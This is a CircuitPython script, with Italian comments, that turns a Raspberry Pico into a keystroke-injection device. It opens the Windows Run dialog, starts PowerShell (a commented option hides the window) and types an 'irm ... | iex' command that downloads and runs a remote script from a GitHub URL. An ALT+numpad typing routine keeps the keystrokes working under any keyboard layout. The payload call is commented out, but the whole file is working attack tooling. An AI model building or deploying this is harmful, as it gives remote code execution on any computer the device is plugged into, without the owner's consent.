import time
import usb_hid
import sys
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS 

INITIAL_SLEEP_TIME = 2.0
SLEEP_TIME = 0.5

PAYLOAD_URL = "https://raw.githubusercontent.com/davide-fornaro/raspberry_pico_keyboard/refs/heads/main/script.ps1"
PAYLOAD_COMMAND = f"irm {PAYLOAD_URL} | iex"

NUMPAD = {
    '0': Keycode.KEYPAD_ZERO, '1': Keycode.KEYPAD_ONE, '2': Keycode.KEYPAD_TWO,
    '3': Keycode.KEYPAD_THREE, '4': Keycode.KEYPAD_FOUR, '5': Keycode.KEYPAD_FIVE,
    '6': Keycode.KEYPAD_SIX, '7': Keycode.KEYPAD_SEVEN, '8': Keycode.KEYPAD_EIGHT,
    '9': Keycode.KEYPAD_NINE
}

try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except OSError:
    sys.exit() 

time.sleep(INITIAL_SLEEP_TIME)

def sync_numlock():
    """
    Legge l'Output Report USB dall'OS per verificare lo stato del LED NumLock.
    Se è disabilitato, invia lo scancode per accenderlo e stabilizzare l'ambiente.
    """
    # Keyboard.LED_NUM_LOCK corrisponde al bit 1 del report HID
    if not kbd.led_on(Keyboard.LED_NUM_LOCK):
        kbd.send(Keycode.KEYPAD_NUMLOCK)
        # Pausa critica: diamo tempo al kernel di Windows di elaborare 
        # l'interrupt, cambiare stato e rispedire l'Output Report di conferma.
        time.sleep(0.1)

def write_with_alt(text):
    sync_numlock()  # Assicuriamoci che NumLock sia attivo prima di inviare i codici ALT

    for carattere in text:
        ascii_val = ord(carattere)
        
        if ascii_val in (10, 13):
            kbd.send(Keycode.ENTER)
            time.sleep(0.01) # Latenza per smaltire l'invio
            continue
            
        # Rigore matematico: formatta l'intero a stringa con padding di 4 zeri (es. 124 -> "0124")
        ascii_str = f"{ascii_val:04d}"
        
        kbd.press(Keycode.LEFT_ALT)
        time.sleep(0.01) # Stabilizza il bus prima di inviare i numeri
        
        for digit in ascii_str:
            kbd.press(NUMPAD[digit])
            time.sleep(0.01) # T_dwell: tempo in cui il tasto è premuto
            kbd.release(NUMPAD[digit])
            time.sleep(0.01) # T_flight: attesa prima del tasto successivo
            
        kbd.release(Keycode.LEFT_ALT)
        time.sleep(0.01) # Pausa tra un carattere e l'altro
def win_exec(text):
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(SLEEP_TIME)
    layout.write(text)
    
def exec_payload():
    #win_exec("powershell -w hidden")
    win_exec("powershell")
    time.sleep(SLEEP_TIME)
    kbd.send(Keycode.ENTER)
    
    time.sleep(1.0)
    
    payload_url = PAYLOAD_COMMAND
    layout.write(payload_url)
    
    time.sleep(SLEEP_TIME)
    kbd.send(Keycode.ENTER)

#exec_payload()